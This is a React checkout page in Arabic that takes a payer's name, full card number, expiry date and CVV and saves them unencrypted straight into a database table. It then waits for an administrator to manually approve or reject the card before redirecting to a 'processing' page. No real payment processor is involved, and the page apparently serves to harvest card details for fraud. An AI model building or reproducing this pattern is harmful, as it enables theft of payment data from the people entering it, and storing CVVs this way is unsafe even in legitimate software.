import { useState, useMemo, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { Alert, AlertDescription } from "@/components/ui/alert";
const Payment = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const {
    orderData,
    updateOrderData
  } = useOrder();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "";
  const price = parseFloat(searchParams.get("price") || "0");
  const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
  const discount = Math.round((regularPrice - price) / regularPrice * 100);
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [rejectionError, setRejectionError] = useState(false);

  // Listen to status changes in real-time
  useEffect(() => {
    if (!orderData.sequenceNumber || !waitingApproval) return;

    const channel = supabase
      .channel(`order-${orderData.sequenceNumber}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'customer_orders',
          filter: `sequence_number=eq.${orderData.sequenceNumber}`
        },
        (payload: any) => {
          const newStatus = payload.new.status;
          
          if (newStatus === 'approved') {
            setWaitingApproval(false);
            const last4 = cardNumber.slice(-4);
            navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${last4}`);
          } else if (newStatus === 'rejected') {
            setWaitingApproval(false);
            setRejectionError(true);
            toast({
              title: "تم رفض معلومات الدفع",
              description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
              variant: "destructive",
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [orderData.sequenceNumber, waitingApproval, cardNumber, companyName, price, navigate, toast]);

  // Detect card type
  const cardType = useMemo(() => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (/^4/.test(cleaned)) return "visa";
    if (/^5[1-5]/.test(cleaned)) return "mastercard";
    if (/^2[2-7]/.test(cleaned)) return "mastercard";
    return null;
  }, [cardNumber]);
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "");
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
    }
  };
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setCvv(value);
    }
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejectionError(false);

    const expiryDate = `${expiryMonth}/${expiryYear}`;

    // Update context
    updateOrderData({
      cardNumber: cardNumber,
      cardHolderName: cardHolder,
      expiryDate: expiryDate,
      cvv: cvv
    });

    // Update database and set status to waiting_approval
    try {
      if (orderData.sequenceNumber) {
        const { error } = await supabase.from("customer_orders").update({
          card_number: cardNumber,
          card_holder_name: cardHolder,
          expiry_date: expiryDate,
          cvv: cvv,
          status: 'waiting_approval'
        }).eq("sequence_number", orderData.sequenceNumber);

        if (error) throw error;

        // Start waiting for admin approval
        setWaitingApproval(true);
        
        toast({
          title: "تم إرسال البيانات",
          description: "في انتظار موافقة الإدارة على معلومات الدفع...",
        });
      }
    } catch (error) {
      console.error("Error updating order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إرسال البيانات",
        variant: "destructive",
      });
    }
  };
  return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
      {/* Header */}
      <div className="bg-gradient-to-b from-primary to-primary-dark py-8">
        <div className="container mx-auto px-4">
          <Button variant="ghost" onClick={() => navigate(-1)} className="text-white hover:bg-white/10 mb-4">
            <ArrowRight className="ml-2" />
            العودة
          </Button>
          <h1 className="text-2xl font-bold text-white text-center">
            أدخل معلومات البطاقة لإتمام الطلب
          </h1>
        </div>
      </div>

      <div className="container mx-auto px-4 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {/* Payment Form */}
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <h2 className="text-2xl font-bold text-foreground mb-6">معلومات الدفع</h2>
            
            {rejectionError && (
              <Alert variant="destructive" className="mb-6">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.
                </AlertDescription>
              </Alert>
            )}

            {waitingApproval && (
              <Alert className="mb-6 bg-blue-50 border-blue-200">
                <Loader2 className="h-4 w-4 animate-spin" />
                <AlertDescription className="text-blue-900">
                  تم إرسال معلومات الدفع بنجاح. في انتظار موافقة الإدارة...
                </AlertDescription>
              </Alert>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="cardHolder">
                  اسم حامل البطاقة <span className="text-destructive">*</span>
                </Label>
                <Input id="cardHolder" placeholder="الاسم كما هو مكتوب على البطاقة" value={cardHolder} onChange={e => setCardHolder(e.target.value)} required className="text-right" />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardNumber">
                  رقم البطاقة <span className="text-destructive">*</span>
                </Label>
                <div className="relative">
                  <Input id="cardNumber" placeholder="1234 5678 9012 3456" value={formatCardNumber(cardNumber)} onChange={handleCardNumberChange} required className="text-right pr-12" dir="ltr" />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    {cardType === "visa" && <div className="flex items-center gap-1">
                        <div className="text-xs font-bold text-blue-600 bg-blue-50 px-2 py-1 rounded">VISA</div>
                      </div>}
                    {cardType === "mastercard" && <div className="flex items-center gap-1">
                        <div className="flex">
                          <div className="w-4 h-4 rounded-full bg-red-500"></div>
                          <div className="w-4 h-4 rounded-full bg-orange-400 -ml-2"></div>
                        </div>
                        <div className="text-xs font-bold text-orange-600">Mastercard</div>
                      </div>}
                    {!cardType && cardNumber.length > 0 && <CreditCard className="h-5 w-5 text-muted-foreground" />}
                    {!cardNumber && <CreditCard className="h-5 w-5 text-muted-foreground" />}
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label>
                    تاريخ الانتهاء <span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-2">
                    <Input placeholder="YY" value={expiryYear} onChange={e => {
                    const val = e.target.value;
                    if (val.length <= 2 && /^\d*$/.test(val)) setExpiryYear(val);
                  }} required className="text-center" maxLength={2} />
                    <span className="flex items-center text-muted-foreground">/</span>
                    <Input placeholder="MM" value={expiryMonth} onChange={e => {
                    const val = e.target.value;
                    if (val.length <= 2 && /^\d*$/.test(val) && parseInt(val || "0") <= 12) {
                      setExpiryMonth(val);
                    }
                  }} required className="text-center" maxLength={2} />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cvv">
                    رمز الأمان (CVV) <span className="text-destructive">*</span>
                    <span className="text-xs text-muted-foreground mr-1">(خلف البطاقة)</span>
                  </Label>
                  <Input id="cvv" placeholder="123" value={cvv} onChange={handleCvvChange} required className="text-center" maxLength={3} />
                </div>
              </div>

              <Button 
                type="submit" 
                disabled={waitingApproval}
                className="w-full h-14 text-lg bg-accent hover:bg-accent/90"
              >
                {waitingApproval ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    في انتظار الموافقة...
                  </>
                ) : (
                  <>
                    <Lock className="ml-2 h-5 w-5" />
                    إرسال معلومات الدفع
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
              </p>
            </form>
          </div>

          {/* Order Summary & Card Preview */}
          <div className="space-y-6">
            {/* Card Preview */}
            <div className="relative perspective-1000">
              <div className="bg-gradient-to-br from-primary via-primary-dark to-accent rounded-2xl p-6 md:p-8 text-white shadow-2xl relative overflow-hidden">
                {/* Card shine effect */}
                <div className="absolute inset-0 bg-gradient-to-br from-white/20 via-transparent to-transparent opacity-30"></div>
                
                {/* Card content */}
                <div className="relative z-10 flex flex-col justify-between h-full min-h-[200px]">
                  <div className="flex justify-between items-start mb-8">
                    <div className="w-12 h-10 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md shadow-lg"></div>
                    {cardType === "visa" && (
                      <div className="text-2xl font-bold bg-white text-primary px-3 py-1 rounded">VISA</div>
                    )}
                    {cardType === "mastercard" && (
                      <div className="flex items-center gap-1">
                        <div className="w-8 h-8 rounded-full bg-red-500"></div>
                        <div className="w-8 h-8 rounded-full bg-orange-400 -ml-4"></div>
                      </div>
                    )}
                  </div>

                  <div className="space-y-4">
                    <div className="text-xl md:text-2xl tracking-[0.25em] font-mono font-light">
                      {cardNumber ? formatCardNumber(cardNumber).padEnd(19, "•") : "•••• •••• •••• ••••"}
                    </div>
                    
                    <div className="flex justify-between items-end">
                      <div className="flex-1">
                        <div className="text-xs text-white/70 mb-1">حامل البطاقة</div>
                        <div className="font-medium text-sm md:text-base uppercase">
                          {cardHolder || "CARDHOLDER NAME"}
                        </div>
                      </div>
                      <div>
                        <div className="text-xs text-white/70 mb-1 text-right">تاريخ الانتهاء</div>
                        <div className="font-mono text-sm md:text-base">
                          {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Order Summary */}
            <div className="bg-white rounded-2xl shadow-lg p-6">
              <h3 className="text-xl font-bold text-foreground mb-4">ملخص الطلب</h3>
              
              <div className="space-y-4">
                <div className="flex justify-between items-start pb-4 border-b border-border">
                  <div className="flex-1">
                    <div className="text-sm text-muted-foreground mb-1">الشركة:</div>
                    <div className="font-medium text-foreground">{companyName}</div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">السعر الأصلي:</span>
                    <span className="line-through text-muted-foreground">{regularPrice.toFixed(2)} ﷼</span>
                  </div>
                  
                  <div className="flex justify-between text-sm">
                    <span className="text-accent font-medium">الخصم {discount}%:</span>
                    <span className="text-accent font-medium">- {(regularPrice - price).toFixed(2)} ﷼</span>
                  </div>
                </div>

                <div className="pt-4 border-t border-border">
                  <div className="flex justify-between items-center">
                    <span className="text-lg font-bold">المبلغ الإجمالي:</span>
                    <span className="text-2xl font-bold text-primary">{price.toFixed(2)} ﷼</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>;
};
export default Payment;